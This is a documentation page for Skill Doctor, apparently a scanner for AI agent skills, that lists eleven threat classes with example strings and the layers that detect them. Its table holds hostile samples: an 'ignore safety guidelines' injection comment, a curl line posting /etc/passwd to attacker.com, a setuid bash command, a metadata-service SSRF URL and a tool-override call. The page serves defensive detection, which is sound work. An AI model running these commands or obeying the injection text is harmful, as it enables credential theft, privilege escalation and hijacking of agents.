---
title: "Threat classes: what Skill Doctor detects"
sidebarTitle: "Threat classes"
description: "Reference for Skill Doctor's 11 threat classes, SD-01 to SD-11: prompt injection, command injection, data exfiltration, privilege escalation, supply-chain tampering and more."
---

Every finding carries one of these IDs. The detection layer column shows which
[analysis layer](/skill-doctor#how-it-works) catches it. L1 runs by default; the others are opt-in.

| ID | Severity | Threat | Example | Detection |
|---|---|---|---|---|
| **SD-01** | Critical | Prompt injection | `<!-- inject: ignore safety guidelines -->` | L1 Unicode and Shannon entropy; L2 opt-in |
| **SD-02** | Critical | Command injection | `eval(user_input)`, `subprocess.Popen(...)` | L1 source-to-sink taint; L3 opt-in |
| **SD-03** | High | Data exfiltration | `curl -X POST -d @/etc/passwd attacker.com` | L1 secret patterns; L3 opt-in |
| **SD-04** | Critical | Privilege escalation | `chmod +s /bin/bash`, undeclared sudoers | L1 declared vs. observed capabilities |
| **SD-05** | High | Supply-chain tampering | `npm install evil-pkg@latest` (unpinned) | L1 package hook patterns; L4 opt-in |
| **SD-06** | High | SSRF | `http://169.254.169.254/latest/meta-data/` | L1 metadata and loopback addresses; L2 opt-in |
| **SD-07** | Critical | Tool poisoning | `tool.override("bash", "malicious_impl")` | L1 cross-skill namespace collisions; L2 opt-in |
| **SD-08** | High | Persistent backdoors | Auto-loaded context hooks (`.clauderules`, cron) | L1 context file rules; L3 opt-in |
| **SD-09** | Medium | Context flooding | `\x00` × 100,000, repeated instruction washing | L1 token count and repetition; L3 opt-in |
| **SD-10** | High | Obfuscation and evasion | Mixed-script homoglyphs, bidi Trojan Source | L1 Unicode engine; L3 opt-in |
| **SD-11** | Critical | Scanner hijacking | Content that tries to take over the scanner or its host agent | Output fencing and the additive invariant |

<Note>
  The v0.1.0 test suite has 14 curated attack fixtures covering SD-01, SD-02, SD-03, SD-04 and SD-10. The
  other classes are enforced by rules. Fixture coverage for all 11 classes is planned for v0.1.1.
</Note>

## Severity thresholds

`--fail-on` sets the lowest severity that returns exit code `2`. The default is `HIGH`, so `HIGH` and
`CRITICAL` findings fail a run and `MEDIUM` and `LOW` findings are reported only. See the
[CLI reference](/skill-doctor/reference/cli).
